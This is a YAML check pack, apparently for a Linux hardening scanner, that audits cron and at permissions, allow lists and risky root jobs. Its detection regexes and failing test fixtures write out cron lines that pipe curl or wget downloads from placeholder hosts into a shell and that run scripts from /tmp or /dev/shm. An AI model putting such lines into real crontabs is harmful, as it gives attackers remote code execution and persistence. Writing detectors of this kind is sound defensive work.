@@ -1,0 +1,213 @@
+pack: cron
+title: cron and at scheduling
+description: Ownership and modes of the system crontab, cron directories and user spools, who may schedule jobs, and root jobs that run code from world-writable locations or straight from the network. Scripts called by root jobs are checked by cron:writable-script.
+category: filesystem
+references:
+  - https://man7.org/linux/man-pages/man5/crontab.5.html
+  - https://www.cisecurity.org/cis-benchmarks
+checks:
+  - id: cron:crontab-perms
+    title: /etc/crontab is writable by non-root users
+    description: Anyone who can write /etc/crontab can schedule commands as root.
+    severity: critical
+    level: basic
+    tags: [cis]
+    probe: {type: file, path: /etc/crontab}
+    expect: ["uid eq 0", "mode bits_none 0022"]
+    remediation: Restore root ownership and remove group/other write access.
+    fix: chown root:root /etc/crontab && chmod 600 /etc/crontab
+    tests:
+      pass: {files: {/etc/crontab: "SHELL=/bin/sh\n"}, meta: {/etc/crontab: "0644 0 0"}}
+      fail: {files: {/etc/crontab: "SHELL=/bin/sh\n"}, meta: {/etc/crontab: "0664 0 1000"}}
+
+  - id: cron:crontab-readable
+    title: /etc/crontab is readable by all users
+    description: CIS recommends 0600 so unprivileged users can't learn which root jobs run and when (reconnaissance for cron-based escalation). Debian ships 0644.
+    severity: low
+    level: strict
+    tags: [cis]
+    probe: {type: file, path: /etc/crontab}
+    expect: ["mode perm_max 0600"]
+    remediation: Restrict /etc/crontab to root.
+    fix: chmod 600 /etc/crontab
+    tests:
+      pass: {files: {/etc/crontab: ""}, meta: {/etc/crontab: "0600 0 0"}}
+      fail: {files: {/etc/crontab: ""}, meta: {/etc/crontab: "0644 0 0"}}
+
+  - id: cron:dir-perms
+    title: cron directory is writable by non-root users
+    description: Files dropped into /etc/cron.d or run-parts directories (cron.hourly/daily/weekly/monthly) run as root.
+    severity: critical
+    level: basic
+    tags: [cis]
+    probe: {type: file, path: [/etc/cron.d, /etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly]}
+    where: ["type eq dir"]
+    expect: ["uid eq 0", "mode bits_none 0022"]
+    remediation: Restore root ownership and remove group/other write access.
+    fix: "chown root:root {path} && chmod 700 {path}"
+    tests:
+      pass: {meta: {/etc/cron.d: "d0755 0 0", /etc/cron.daily: "d0700 0 0"}}
+      fail: {meta: {/etc/cron.d: "d0755 0 0", /etc/cron.daily: "d0775 0 1000"}, findings: 1}
+
+  - id: cron:dir-readable
+    title: cron directories are readable by all users
+    description: CIS recommends 0700 on the cron directories so unprivileged users can't enumerate root's jobs.
+    severity: low
+    level: strict
+    tags: [cis]
+    probe: {type: file, path: [/etc/cron.d, /etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly]}
+    where: ["type eq dir"]
+    expect: ["mode perm_max 0700"]
+    remediation: Restrict the cron directories to root.
+    fix: "chmod 700 {path}"
+    tests:
+      pass: {meta: {/etc/cron.d: "d0700 0 0"}}
+      fail: {meta: {/etc/cron.d: "d0755 0 0"}}
+
+  - id: cron:d-file-perms
+    title: /etc/cron.d entry is writable by non-root users
+    description: Each file in /etc/cron.d is a system crontab that can run commands as root; it must be root-owned and not group/world-writable.
+    severity: critical
+    level: basic
+    probe: {type: file, path: /etc/cron.d/*}
+    where: ["type eq file"]
+    expect: ["uid eq 0", "mode bits_none 0022"]
+    remediation: Restore root ownership and mode 0644 (or 0600), then review the file's contents.
+    fix: "chown root:root {path} && chmod 600 {path}"
+    tests:
+      pass: {files: {/etc/cron.d/backup: "0 3 * * * root /usr/local/bin/backup\n"}, meta: {/etc/cron.d/backup: "0644 0 0"}}
+      fail: {files: {/etc/cron.d/backup: "0 3 * * * root /usr/local/bin/backup\n"}, meta: {/etc/cron.d/backup: "0666 0 0"}}
+
+  - id: cron:allow-perms
+    title: cron/at allow or deny list is writable by non-root users
+    description: Whoever can edit cron.allow/at.allow (or the deny lists) decides who may schedule jobs.
+    severity: medium
+    tags: [cis]
+    probe: {type: file, path: [/etc/cron.allow, /etc/at.allow, /etc/cron.deny, /etc/at.deny]}
+    expect: ["uid eq 0", "mode bits_none 0022"]
+    remediation: Restore root ownership and mode 0640.
+    fix: "chown root:root {path} && chmod 640 {path}"
+    tests:
+      pass: {files: {/etc/cron.allow: "root\n"}, meta: {/etc/cron.allow: "0640 0 0"}}
+      fail: {files: {/etc/cron.deny: ""}, meta: {/etc/cron.deny: "0666 0 0"}}
+
+  - id: cron:allow-missing
+    title: cron is not restricted with cron.allow
+    description: Without /etc/cron.allow every user not in cron.deny can schedule jobs, a common persistence mechanism for compromised accounts.
+    severity: low
+    level: strict
+    tags: [cis]
+    applies_if: {file: [/etc/crontab, /etc/cron.d]}
+    probe: {type: file, path: /etc/cron.allow}
+    expect: ["type eq file"]
+    missing: fail
+    missing_evidence: /etc/cron.allow does not exist
+    remediation: Create /etc/cron.allow listing the users allowed to use cron (and remove cron.deny).
+    fix: "echo root > /etc/cron.allow && chmod 640 /etc/cron.allow && rm -f /etc/cron.deny"
+    tests:
+      pass: {files: {/etc/crontab: "", /etc/cron.allow: "root\n"}}
+      fail: {files: {/etc/crontab: ""}}
+      na: {files: {}}
+
+  - id: cron:at-allow-missing
+    title: at is not restricted with at.allow
+    description: Without /etc/at.allow every user not in at.deny can queue jobs with at.
+    severity: low
+    level: strict
+    tags: [cis]
+    applies_if: {binary: at}
+    probe: {type: file, path: /etc/at.allow}
+    expect: ["type eq file"]
+    missing: fail
+    missing_evidence: /etc/at.allow does not exist
+    remediation: Create /etc/at.allow listing allowed users (and remove at.deny).
+    fix: "echo root > /etc/at.allow && chmod 640 /etc/at.allow && rm -f /etc/at.deny"
+    tests:
+      pass: {files: {/usr/bin/at: "", /etc/at.allow: "root\n"}}
+      fail: {files: {/usr/bin/at: ""}}
+      na: {files: {}}
+
+  - id: cron:daemon-inactive
+    title: cron daemon installed but not running
+    description: Security-relevant scheduled jobs (log rotation, updates, integrity checks) silently stop when cron is down.
+    severity: low
+    level: strict
+    tags: [cis]
+    probe: {type: systemd, name: [crond.service, cron.service, cronie.service]}
+    expect: ["ActiveState eq active"]
+    remediation: Enable and start the cron daemon.
+    fix: "systemctl enable --now {unit}"
+    tests:
+      pass:
+        cmds:
+          "systemctl show crond.service --property=LoadState,ActiveState,UnitFileState": "LoadState=loaded\nActiveState=active\nUnitFileState=enabled\n"
+          "systemctl show cron.service --property=LoadState,ActiveState,UnitFileState": "LoadState=not-found\n"
+          "systemctl show cronie.service --property=LoadState,ActiveState,UnitFileState": "LoadState=not-found\n"
+      fail:
+        cmds:
+          "systemctl show crond.service --property=LoadState,ActiveState,UnitFileState": "LoadState=not-found\n"
+          "systemctl show cron.service --property=LoadState,ActiveState,UnitFileState": "LoadState=loaded\nActiveState=inactive\nUnitFileState=disabled\n"
+          "systemctl show cronie.service --property=LoadState,ActiveState,UnitFileState": "LoadState=not-found\n"
+
+  - id: cron:spool-writable
+    title: cron spool directory is world-writable
+    description: A world-writable /var/spool/cron lets any user delete or replace other users' crontabs.
+    severity: high
+    probe: {type: file, path: [/var/spool/cron, /var/spool/cron/crontabs]}
+    where: ["type eq dir"]
+    expect: ["mode bits_none 0002"]
+    remediation: Restore the distribution mode (RHEL /var/spool/cron 0700 root; Debian crontabs 1730 root:crontab).
+    fix: "chmod o-w {path}"
+    tests:
+      pass: {meta: {/var/spool/cron: "d0755 0 0", /var/spool/cron/crontabs: "d1730 0 102"}}
+      fail: {meta: {/var/spool/cron: "d0777 0 0"}}
+
+  - id: cron:user-crontab-perms
+    title: User crontab file is writable by other users
+    description: A group- or world-writable spool crontab can be rewritten by other users to run commands as its owner (often root); most cron daemons reject such files, which also silently disables the jobs.
+    severity: medium
+    probe: {type: file, path: [/var/spool/cron/*, /var/spool/cron/crontabs/*]}
+    where: ["type eq file"]
+    expect: ["mode bits_none 0022"]
+    remediation: Restore mode 0600 (owner = the crontab's user) and review the jobs.
+    fix: "chmod 600 {path}"
+    tests:
+      pass: {files: {/var/spool/cron/root: "@daily /usr/local/bin/x\n"}, meta: {/var/spool/cron/root: "0600 0 0", /var/spool/cron/crontabs: "d1730 0 102"}}
+      fail: {files: {/var/spool/cron/crontabs/root: "@daily /usr/local/bin/x\n"}, meta: {/var/spool/cron/crontabs/root: "0666 0 0"}}
+
+  - id: cron:root-job-from-tmp
+    title: Root cron job runs something from a world-writable directory
+    description: A root job that executes or sources a file under /tmp, /var/tmp or /dev/shm can be hijacked by any local user who creates that file first.
+    severity: high
+    probe: {type: cron}
+    where:
+      - "user eq root"
+      - 'command regex (^|[;&|(]\s*|\b(ba|da|z|k)?sh\s+(-\S+\s+)*|\bsource\s+|(^|\s)\.\s+|\b(python[0-9.]*|perl|php|ruby|node)\s+)/(tmp|var/tmp|dev/shm)/'
+    expect_none: true
+    evidence: "{_loc}: {command}"
+    remediation: Move the script to a root-owned directory such as /usr/local/sbin.
+    fix: "edit {file}"
+    tests:
+      pass: {files: {/etc/crontab: "0 3 * * * root /usr/local/sbin/backup > /tmp/backup.log 2>&1\n"}}
+      fail:
+        - {files: {/etc/cron.d/x: "*/5 * * * * root /tmp/.cache/run.sh\n"}}
+        - {files: {/etc/crontab: "0 1 * * * root cd / && bash /dev/shm/job.sh\n"}}
+
+  - id: cron:pipe-to-shell
+    title: Cron job pipes downloaded or decoded content into a shell
+    description: "'curl ... | sh' or 'base64 -d | sh' in a crontab runs whatever the remote server (or an attacker controlling it) returns on every run; this is also a common malware persistence pattern."
+    severity: medium
+    probe: {type: cron}
+    where:
+      - 'command regex (curl|wget|fetch)\s[^|;]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b|base64\s+(-d|--decode)[^|;]*\|\s*(ba|z|da|k)?sh\b'
+    expect_none: true
+    evidence: "{_loc} (user {user}): {command}"
+    severity_if:
+      - {when: "user eq root", severity: high}
+    remediation: Investigate the job's origin; replace it with a pinned, verified script stored on the host.
+    fix: "edit {file}"
+    tests:
+      pass: {files: {/etc/crontab: "0 * * * * root curl -fsS https://example.org/ping > /dev/null\n"}}
+      fail:
+        - {files: {/etc/crontab: "*/10 * * * * root curl -fsSL http://example.net/x | bash\n"}, severity: high}
+        - {files: {/var/spool/cron/crontabs/www-data: "@hourly wget -q -O- http://example.org/u | sh\n"}, severity: medium}
